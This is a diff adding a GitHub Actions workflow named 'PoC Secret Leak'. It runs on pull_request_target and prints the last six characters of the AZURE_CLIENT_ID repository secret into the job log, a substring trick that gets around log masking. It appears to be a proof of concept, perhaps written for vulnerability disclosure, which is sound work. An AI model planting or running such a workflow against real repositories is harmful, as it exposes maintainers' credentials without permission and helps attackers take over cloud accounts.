@@ -1,0 +1,11 @@
+name: PoC Secret Leak
+on:
+  pull_request_target:
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak Last 6 Chars
+        run: echo "AZURE_CLIENT_ID last 6 chars: ${AZURE_CLIENT_ID: -6}"
+        env:
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
